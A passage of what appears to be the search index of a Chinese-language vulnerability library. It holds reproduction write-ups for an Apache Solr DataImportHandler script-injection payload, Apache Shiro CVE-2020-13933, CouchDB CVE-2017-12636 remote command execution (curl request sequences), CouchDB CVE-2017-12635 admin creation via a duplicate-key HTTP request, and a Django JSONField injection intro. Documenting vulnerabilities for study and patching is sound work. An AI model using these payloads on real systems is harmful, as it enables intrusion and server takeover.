close\n\ncommand=full-import&amp;verbose=false&amp;clean=false&amp;commit=true&amp;debug=true&amp;core=&lt;your_core_name&gt;&amp;name=dataimport&amp;dataConfig=\n&lt;dataConfig&gt;\n&lt;dataSource type=\"URLDataSource\"&gt;&lt;/dataSource&gt;\n&lt;script&gt;&lt;![CDATA[\nfunction poc(row){\nvar process= java.lang.Runtime.getRuntime();\nprocess.exec(\"calc\");\nreturn row;\n}\n]]&gt;&lt;/script&gt;\n&lt;document&gt;\n&lt;entity name=\"stackoverflow\"\nurl=\"https://stackoverflow.com/feeds/tag/solr\"\nprocessor=\"XPathEntityProcessor\"\nforEach=\"/feed\"\ntransformer=\"script:poc\" &gt;&lt;/entity&gt;\n&lt;/document&gt;\n&lt;/dataConfig&gt;\n</code></pre> <p></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20shiro/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/","title":"Apache Shiro \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE 2020 13933\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20shiro/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u4fe1\u606f","text":"<p>2020\u5e748\u670817\u65e5\uff0cApache Shiro\u5b98\u65b9\u53d1\u5e03\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e861.6.0\u7248\u672c\u4e4b\u524d\u5b58\u5728\u7684\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff0c\u5bf9\u5e94CVE\u7f16\u53f7\u4e3aCVE-2020-13933\u3002\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5236\u7684HTTP\u8bf7\u6c42\u5c06\u5bfc\u81f4Shiro\u7684\u6743\u9650\u673a\u5236\u88ab\u7ed5\u8fc7\uff0c\u4ece\u800c\u53ef\u4ee5\u8bbf\u95ee\u9700\u8981\u6743\u9650\u7684\u9875\u9762\uff0c\u5bfc\u81f4\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u7b49\u5371\u5bb3\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20shiro/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/#_2","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u7248\u672c1.6.0\u4e4b\u524d\u7684Apache Shiro\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5236\u7684HTTP\u8bf7\u6c42\u5c06\u5bfc\u81f4Shiro\u7684\u6743\u9650\u673a\u5236\u88ab\u7ed5\u8fc7\uff0c\u4ece\u800c\u53ef\u4ee5\u8bbf\u95ee\u9700\u8981\u6743\u9650\u7684\u9875\u9762\uff0c\u5bfc\u81f4\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u7b49\u5371\u5bb3\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20shiro/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/#_3","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Apache Shiro &lt;1.6.0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20shiro/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20shiro/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/#_5","title":"\u4fee\u590d\u65b9\u6848","text":"<p>Shiro\u5df2\u7ecf\u53d1\u5e03\u4e86\u5b89\u5168\u4fee\u590d\u7248\u672c1.6.0\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5347\u7ea7\u52301.6.0\u5373\u4ee5\u4e0a\u7248\u672c\u3002</p> <p>1.\u5347\u7ea71.6.0\u7248\u672c\u53ca\u4ee5\u4e0a</p> <p>2.\u5c3d\u91cf\u907f\u514d\u4f7f\u7528*\u901a\u914d\u7b26\u4f5c\u4e3a\u52a8\u6001\u8def\u7531\u62e6\u622a\u5668\u7684URL\u8def\u5f84\u8868\u8fbe\u5f0f</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20shiro/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13933%EF%BC%89/#_6","title":"\u53c2\u8003\u8d44\u6599","text":"<p>https://vas.riskivy.com/vuln-detail?id=54</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/","title":"Apache couchdb \u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08cve-2017-12636\uff09","text":"<p>Apache  CouchDB\u662f\u4e00\u4e2a\u5f00\u6e90\u6570\u636e\u5e93\uff0c\u4e13\u6ce8\u4e8e\u6613\u7528\u6027\u548c\u6210\u4e3a\"\u5b8c\u5168\u62e5\u62b1web\u7684\u6570\u636e\u5e93\"\u3002\u5b83\u662f\u4e00\u4e2a\u4f7f\u7528JSON\u4f5c\u4e3a\u5b58\u50a8\u683c\u5f0f\uff0cJavaScript\u4f5c\u4e3a\u67e5\u8be2\u8bed\u8a00\uff0cMapReduce\u548cHTTP\u4f5c\u4e3aAPI\u7684NoSQL\u6570\u636e\u5e93\u3002\u5e94\u7528\u5e7f\u6cdb\uff0c\u5982BBC\u7528\u5728\u5176\u52a8\u6001\u5185\u5bb9\u5c55\u793a\u5e73\u53f0\uff0cCredit Suisse\u7528\u5728\u5176\u5185\u90e8\u7684\u5546\u54c1\u90e8\u95e8\u7684\u5e02\u573a\u6846\u67b6\uff0cMeebo\uff0c\u7528\u5728\u5176\u793e\u4ea4\u5e73\u53f0\uff08web\u548c\u5e94\u7528\u7a0b\u5e8f\uff09\u3002</p> <p>\u57282017\u5e7411\u670815\u65e5\uff0cCVE-2017-12635\u548cCVE-2017-12636\u62ab\u9732\uff0cCVE-2017-12636\u662f\u4e00\u4e2a\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7config api\u4fee\u6539couchdb\u7684\u914d\u7f6e<code>query_server</code>\uff0c\u8fd9\u4e2a\u914d\u7f6e\u9879\u5728\u8bbe\u8ba1\u3001\u6267\u884cview\u7684\u65f6\u5019\u5c06\u88ab\u8fd0\u884c\u3002</p> <p>\u5f71\u54cd\u7248\u672c\uff1a\u5c0f\u4e8e 1.7.0 \u4ee5\u53ca \u5c0f\u4e8e 2.1.1</p> <p>\u53c2\u8003\u94fe\u63a5\uff1a</p> <ul> <li>http://bobao.360.cn/learning/detail/4716.html</li> <li>https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#_1","title":"\u6d4b\u8bd5\u73af\u5883","text":"<p>Couchdb 2.x\u548c\u548c1.x\u7684API\u63a5\u53e3\u6709\u4e00\u5b9a\u533a\u522b\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u5f0f\u4e5f\u4e0d\u540c\u3002\u672c\u73af\u5883\u542f\u52a8\u7684\u662f1.6.0\u7248\u672c\uff0c\u5982\u679c\u4f60\u60f3\u6d4b\u8bd52.1.0\u7248\u672c\uff0c\u53ef\u4ee5\u542f\u52a8CVE-2017-12635\u9644\u5e26\u7684\u73af\u5883\u3002</p> <p>\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u52a8Couchdb 1.6.0\u73af\u5883\uff1a</p> <pre><code>docker-compose up -d\n</code></pre> <p>\u542f\u52a8\u5b8c\u6210\u540e\uff0c\u8bbf\u95ee<code>http://your-ip:5984/</code>\u5373\u53ef\u770b\u5230Couchdb\u7684\u6b22\u8fce\u9875\u9762\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#_2","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u8be5\u6f0f\u6d1e\u662f\u9700\u8981\u767b\u5f55\u7528\u6237\u65b9\u53ef\u89e6\u53d1\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u76ee\u6807\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u53ef\u4ee5\u5229\u7528</p> <p>\u300acouchdb \u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2017-12635\uff09\u300b</p> <p>https://blog.csdn.net/whatday/article/details/106617994</p> <p>\u5148\u589e\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#160","title":"1.6.0 \u4e0b\u7684\u8bf4\u660e","text":"<p>\u4f9d\u6b21\u6267\u884c\u5982\u4e0b\u8bf7\u6c42\u5373\u53ef\u89e6\u53d1\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff1a</p> <pre><code>curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '\"id &gt;/tmp/success\"'\n\n\n\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'\n\n\n\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}'\n\n\n\ncurl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type:application/json'\n</code></pre> <p>\u5176\u4e2d,<code>vulhub:vulhub</code>\u4e3a\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\u3002</p> <p>\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u662f\u6dfb\u52a0\u4e00\u4e2a\u540d\u5b57\u4e3a<code>cmd</code>\u7684<code>query_servers</code>\uff0c\u5176\u503c\u4e3a<code>\"id &gt;/tmp/success\"</code>\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u540e\u9762\u5f85\u6267\u884c\u7684\u547d\u4ee4\u3002</p> <p>\u7b2c\u4e8c\u3001\u4e09\u4e2a\u8bf7\u6c42\u662f\u6dfb\u52a0\u4e00\u4e2aDatabase\u548cDocument\uff0c\u8fd9\u91cc\u6dfb\u52a0\u4e86\u540e\u9762\u624d\u80fd\u67e5\u8be2\u3002</p> <p>\u7b2c\u56db\u4e2a\u8bf7\u6c42\u5c31\u662f\u5728\u8fd9\u4e2aDatabase\u91cc\u8fdb\u884c\u67e5\u8be2\uff0c\u56e0\u4e3a\u6211\u5c06language\u8bbe\u7f6e\u4e3a<code>cmd</code>\uff0c\u8fd9\u91cc\u5c31\u4f1a\u7528\u5230\u6211\u7b2c\u4e00\u6b65\u91cc\u6dfb\u52a0\u7684\u540d\u4e3a<code>cmd</code>\u7684<code>query_servers</code>\uff0c\u6700\u540e\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#210","title":"2.1.0 \u4e0b\u7684\u8bf4\u660e","text":"<p>2.1.0\u4e2d\u4fee\u6539\u4e86\u6211\u4e0a\u9762\u7528\u5230\u7684\u4e24\u4e2aAPI\uff0c\u8fd9\u91cc\u9700\u8981\u8be6\u7ec6\u8bf4\u660e\u4e00\u4e0b\u3002</p> <p>Couchdb 2.x \u5f15\u5165\u4e86\u96c6\u7fa4\uff0c\u6240\u4ee5\u4fee\u6539\u914d\u7f6e\u7684API\u9700\u8981\u589e\u52a0node name\u3002\u8fd9\u4e2a\u5176\u5b9e\u4e5f\u7b80\u5355\uff0c\u6211\u4eec\u5e26\u4e0a\u8d26\u53f7\u5bc6\u7801\u8bbf\u95ee<code>/_membership</code>\u5373\u53ef\uff1a</p> <pre><code>curl http://vulhub:vulhub@your-ip:5984/_membership\n</code></pre> <p> </p> <p>\u53ef\u89c1\uff0c\u6211\u4eec\u8fd9\u91cc\u53ea\u6709\u4e00\u4e2anode\uff0c\u540d\u5b57\u662f<code>nonode@nohost</code>\u3002</p> <p>\u7136\u540e\uff0c\u6211\u4eec\u4fee\u6539<code>nonode@nohost</code>\u7684\u914d\u7f6e\uff1a</p> <pre><code>curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id &gt;/tmp/success\"'\n</code></pre> <p></p> <p>\u7136\u540e\uff0c\u4e0e1.6.0\u7684\u5229\u7528\u65b9\u5f0f\u76f8\u540c\uff0c\u6211\u4eec\u5148\u589e\u52a0\u4e00\u4e2aDatabase\u548c\u4e00\u4e2aDocument\uff1a</p> <pre><code>curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'\n\n\n\ncurl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}'\n</code></pre> <p>Couchdb 2.x\u5220\u9664\u4e86<code>_temp_view</code>\uff0c\u6240\u4ee5\u6211\u4eec\u4e3a\u4e86\u89e6\u53d1<code>query_servers</code>\u4e2d\u5b9a\u4e49\u7684\u547d\u4ee4\uff0c\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a<code>_view</code>\uff1a</p> <pre><code>curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}' -H \"Content-Type: application/json\"\n</code></pre> <p>\u589e\u52a0<code>_view</code>\u7684\u540c\u65f6\u5373\u89e6\u53d1\u4e86<code>query_servers</code>\u4e2d\u7684\u547d\u4ee4\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#_3","title":"\u5229\u7528\u811a\u672c","text":"<p>\u5199\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u811a\u672c \u4e0b\u8f7d\u5730\u5740</p> <p>https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</p> <p>\u4fee\u6539\u5176\u4e2d\u7684target\u548ccommand\u4e3a\u4f60\u7684\u6d4b\u8bd5\u673a\u5668\uff0c\u7136\u540e\u4fee\u6539version\u4e3a\u5bf9\u5e94\u7684Couchdb\u7248\u672c\uff081\u62162\uff09\uff0c\u6210\u529f\u53cd\u5f39shell\uff1a</p> <p></p> <p>\u9776\u673a\u73af\u5883\uff1a</p> <p>https://vulhub.org/#/environments/couchdb/CVE-2017-12636/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchedb%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9ECVE-2017-12635/Couchdb%20%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12635%EF%BC%89%E6%BC%8F%E6%B4%9E/","title":"Couchdb \u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2017-12635\uff09\u6f0f\u6d1e","text":"<p>couchdb\u7b80\u4ecb\uff1a</p> <ul> <li>Apache CouchDB\u662f\u4e00\u4e2a\u5f00\u6e90\u7684NoSQL\u6570\u636e\u5e93\uff0c\u4e13\u6ce8\u4e8e\u6613\u7528\u6027\u548c\u6210\u4e3a\u201c\u5b8c\u5168\u62e5\u62b1web\u7684\u6570\u636e\u5e93\u201d\u3002\u5b83\u662f\u4e00\u4e2a\u4f7f\u7528JSON\u4f5c\u4e3a\u6570\u636e\u5b58\u50a8\u683c\u5f0f\uff0cjavascript\u4f5c\u4e3a\u67e5\u8be2\u8bed\u8a00\uff0cMapReduce\u548cHTTP\u4f5c\u4e3aAPI\u7684NoSQL\u6570\u636e\u5e93\u3002 </li> </ul> <p>\u6f0f\u6d1e\u539f\u7406\uff1a</p> <ul> <li> <p>CVE-2017-12635\uff1aErlang\u548cJavaScript\uff0c\u5bf9JSON\u89e3\u6790\u65b9\u5f0f\u7684\u4e0d\u540c\uff0c\u5bfc\u81f4\u8bed\u53e5\u6267\u884c\u4ea7\u751f\u5dee\u5f02\u6027\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u53ef\u4ee5\u8ba9**\u4efb\u610f\u7528\u6237\u521b\u5efa\u7ba1\u7406\u5458**\uff0c\u5c5e\u4e8e\u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u3002</p> </li> <li> <p>\u4e3e\u4f8b\uff1a</p> </li> </ul> <p><code>Erlang:</code> <code>&gt; jiffy:decode(``\"{\"``a``\":\"``1``\", \"``a``\":\"``2``\"}\"``).</code> <code>{[{&lt;&lt;``\"a\"``&gt;&gt;,&lt;&lt;``\"1\"``&gt;&gt;},{&lt;&lt;``\"a\"``&gt;&gt;,&lt;&lt;``\"2\"``&gt;&gt;}]}</code></p> <pre><code>JavaScript:\n\n&gt; JSON.parse(\"{\"a\":\"1\", \"a\": \"2\"}\")\n\n{a: \"2\"}\n</code></pre> <ul> <li>\u5728\u5b9a\u4e49\u4e00\u5bf9\u952e\u503c\u5bf9\u65f6\uff0cEralang\u89e3\u6790\u5668\u5c06\u5b58\u50a8\u4e24\u4e2a\u503c\uff1bjavascript\u53ea\u5b58\u50a8\u7b2c\u4e8c\u4e2a\u503c\u3002\u4f46jiffy\u5b9e\u73b0\u65f6\uff0cgetter\u51fd\u6570\u53ea\u8fd4\u56de\u7b2c\u4e00\u4e2a\u503c\u3002\u8fd9\u91cc\u6d89\u53ca\u7684\u51fd\u6570\u53c2\u8003\uff1ahttps://www.anquanke.com/post/id/87256\uff1bhttps://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635</li> </ul> <p>\u5f71\u54cd\u7248\u672c\uff1a</p> <ul> <li>\u5c0f\u4e8e 1.7.0 \u4ee5\u53ca \u5c0f\u4e8e 2.1.1</li> </ul> <p>\u590d\u73b0\uff1a</p> <ul> <li>\u6784\u9020\u521b\u5efa\u7528\u6237\u7684\u6570\u636e\u5305</li> <li></li> <li>\u7ed5\u8fc7role\u9a8c\u8bc1\uff1a</li> <li>payload\uff1a</li> <li><code>PUT /_users/org.couchdb.user:vulhub HTTP/1.1``Host: 192.168.183.134:5984``Accept: */*``Accept-Language: en``User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)``Connection: close``Content-Type: application/json``Content-Length: 110</code> <code>{`` ``\"type\"``: ``\"user\"``,`` ``\"name\"``: ``\"vulhub\"``,`` ``\"roles\"``: [``\"_admin\"``],`` ``\"roles\"``:[],`` ``\"password\"``: ``\"vulhub111\"``}</code></li> </ul> <p></p> <p>\u4e00\u4e9b\u5c0f\u601d\u8003\uff1a</p> <ul> <li>\u867d\u7136\u5206\u6790\u8bf4\uff0c\u53ea\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u952e\u503c\uff0c\u6309\u7406\u6765\u8bf4\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662f\u4efb\u610f\u7684\u5e94\u8be5\u4e0d\u5f71\u54cd\uff0c\u4f46\u6211\u6d4b\u8bd5\u53d1\u73b0\uff0c\u53ea\u6709\u4e3a\u7a7a\u65f6\uff0cpoc\u624d\u6b63\u786e\u64cd\u4f5c\u3002</li> </ul> <p></p> <ul> <li>\u4e14\u5728\u521b\u5efa\u4e00\u4e2a\u6210\u529f\u540e\uff0c\u518d\u91cd\u590d\u53d1\u5305\uff0c\u4e5f\u4f1a\u62a5\u9519409\uff0c</li> <li>\u4fee\u6539\u5df2\u521b\u5efa\u7684\u5bc6\u7801\u4e5f\u4e0d\u884c</li> </ul> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"CVE 2019 14234 Django JSONField SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#cve-2019-14234-django-jsonfield-sql","title":"CVE-2019-14234 Django JSONField SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u6807\u7b7e\uff1a \u6f0f\u6d1e\u590d\u73b0 \u5b89\u5168</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x01","title":"0x01\u7b80\u4ecb","text":"<p>Django\u662f\u4e00\u6b3e\u5e7f\u4e3a\u6d41\u884c\u7684\u5f00\u6e90web\u6846\u67b6\uff0c\u7531Python\u7f16\u5199\uff0c\u8bb8\u591a\u7f51\u7ad9\u548capp\u90fd\u57fa\u4e8eDjango\u5f00\u53d1\u3002</p> <p>\u4ec0\u4e48\u662fJSONField\uff0cDjango\u662f\u4e00\u4e2a\u5927\u800c\u5168\u7684Web\u6846\u67b6\uff0c\u5176\u652f\u6301\u5f88\u591a\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5305\u62ecPostgresql\u3001Mysql\u3001Oracle\u3001Sqlite3\u7b49\uff0c\u4f46\u4e0eDjango\u5929\u751f\u4e3a\u4e00\u5bf9\u513f\u7684\u6570\u636e\u5e93\u83ab\u8fc7\u4e8ePostgresql\u4e86\uff0cDjango\u5b98\u65b9\u4e5f\u5efa\u8bae\u914d\u5408Postgresql\u4e00\u8d77\u4f7f\u7528\u3002</p> <p>\u76f8\u6bd4\u4e8eMysql\uff0cPostgresql\u652f\u6301\u7684\u6570\u636e\u7c7b\u578b\u66f4\u52a0\u4e30\u5bcc\uff0c\u5176\u5bf9JSON\u683c\u5f0f\u6570\u636e\u7684\u652f\u6301\u4e5f\u8ba9\u8fd9\u4e2a\u5173\u7cfb\u578b\u6570\u636e\u5e93\u62e5\u6709\u4e86NoSQL\u7684\u4e00\u4e9b\u7279\u70b9\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x02","title":"0x02\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u8be5\u6f0f\u6d1e\u9700\u8981\u5f00\u53d1\u8005\u4f7f\u7528\u4e86JSONField/HStoreField\uff0c\u4e14\u7528\u6237\u53ef\u63a7queryset\u67e5\u8be2\u65f6\u7684\u952e\u540d\uff0c\u5728\u952e\u540d\u7684\u4f4d\u7f6e\u6ce8\u5165SQL\u8bed\u53e5\u3002</p> 